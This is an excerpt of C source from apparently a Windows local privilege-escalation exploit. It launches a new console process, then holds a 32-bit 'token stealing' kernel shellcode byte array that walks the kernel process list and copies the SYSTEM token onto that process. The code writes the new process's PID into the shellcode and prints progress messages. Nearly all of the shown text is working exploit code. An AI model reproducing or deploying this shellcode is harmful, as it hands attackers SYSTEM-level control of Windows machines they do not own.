...
int main()
{
    ...
    else
    {
        ...
        si.cb = sizeof(si);
        BOOL bSuccess = CreateProcessA(NULL, cmd, 0, 0, TRUE, CREATE_NEW_CONSOLE, 0, 0, &si, &pi);
        printf("[+] Spawned new process, PID: %08x\n", pi.dwProcessId);


        // token stealing shellcode - 32bit
        unsigned char shellcode[] = { 
            0xBB, 0xFF, 0xFF, 0xFF, 0xFF, 0x31, 0xC0, 0x64,
            0x8B, 0x80, 0x24, 0x01, 0x00, 0x00, 0x8B, 0x40, 
            0x50, 0x89, 0xC1, 0xBA, 0x04, 0x00, 0x00, 0x00, 
            0xE8, 0x0F, 0x00, 0x00, 0x00, 0x89, 0xC6, 0x89, 
            0xC8, 0x89, 0xDA, 0xE8, 0x04, 0x00, 0x00, 0x00, 
            0x89, 0xC7, 0xEB, 0x14, 0x8B, 0x80, 0xB8, 0x00, 
            0x00, 0x00, 0x2D, 0xB8, 0x00, 0x00, 0x00, 0x39, 
            0x90, 0xB4, 0x00, 0x00, 0x00, 0x75, 0xED, 0xC3, 
            0x8B, 0x96, 0xF8, 0x00, 0x00, 0x00, 0x89, 0x97, 
            0xF8, 0x00, 0x00, 0x00, 0xEB, 0xFE };

        unsigned int funcPointer = 1;

        printf("[+] Will overwrite shellcode at position: %d: 0x%02x%02x%02x%02x\n", funcPointer, *(shellcode + funcPointer), *(shellcode + funcPointer + 1), *(shellcode + funcPointer + 2), *(shellcode + funcPointer + 3));

        // copy the PID in to the shellcode
        memcpy(shellcode + funcPointer, &pi.dwProcessId, 4);
        printf("[+] Written to shellcode at position: %d: 0x%02x%02x%02x%02x\n", funcPointer, *(shellcode+funcPointer), *(shellcode + funcPointer + 1), *(shellcode + funcPointer + 2), *(shellcode + funcPointer + 3));
